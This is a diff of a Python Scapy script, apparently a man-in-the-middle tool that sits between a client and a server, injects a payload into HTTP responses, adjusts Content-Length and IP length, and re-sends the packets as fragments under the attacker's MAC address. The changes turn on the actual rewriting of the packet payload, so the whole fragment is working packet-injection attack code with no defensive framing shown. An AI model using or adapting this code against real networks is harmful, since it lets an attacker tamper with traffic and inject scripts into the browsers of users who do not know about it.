@@ -56,6 +56,7 @@ def interceptor(packet):
 	global clientMAC, clientIP, serverMAC, serverIP, attackerMAC, script
 	if packet[Ether].src == attackerMAC:
 		return
+	
 	if packet.haslayer(IP) and packet[Ether].dst == attackerMAC:
 		if packet[IP].src == serverIP and packet[IP].dst == clientIP:
 			if packet[IP].haslayer(Raw):
@@ -67,22 +68,27 @@ def interceptor(packet):
 					index = loadSubString.index('Content-Length:')
 					length = loadSubString[index+1]
 					newLength = int(length) + len(payload)
+					#print(f"length: {length}")
+					#print(f"new: {newLength}")
 					httpLoad = httpLoad.replace('Content-Length: ' + length, 'Content-Length: ' + str(newLength))
 					#print(httpLoad)
 				except ValueError:
 					pass
-				#packet[Raw].load = httpLoad
-			del packet[IP].len
-			del packet[IP].chksum
-			del packet[TCP].chksum
+				packet[Raw].load = httpLoad.encode('utf-8')
+				packet[IP].len = packet[IP].len + len(payload)
+				del packet[IP].chksum
+				del packet[TCP].chksum
+			packet[Ether].src = attackerMAC
 			packet[Ether].dst = clientMAC
-			#packet.show2(dump=True)
-		else:
+			frags = fragment(packet, fragsize = 500)
+			for frag in frags:
+				sendp(frag)
+		elif packet[IP].src == clientIP and packet[IP].dst == serverIP:
+			packet[Ether].src = attackerMAC
 			packet[Ether].dst = serverMAC
-		packet[Ether].src = attackerMAC
-		frags = fragment(packet, fragsize = 500)
-		for frag in frags:
-			sendp(frag)
+			frags = fragment(packet, fragsize = 500)
+			for frag in frags:
+				sendp(frag)
 
 
 if __name__ == "__main__":
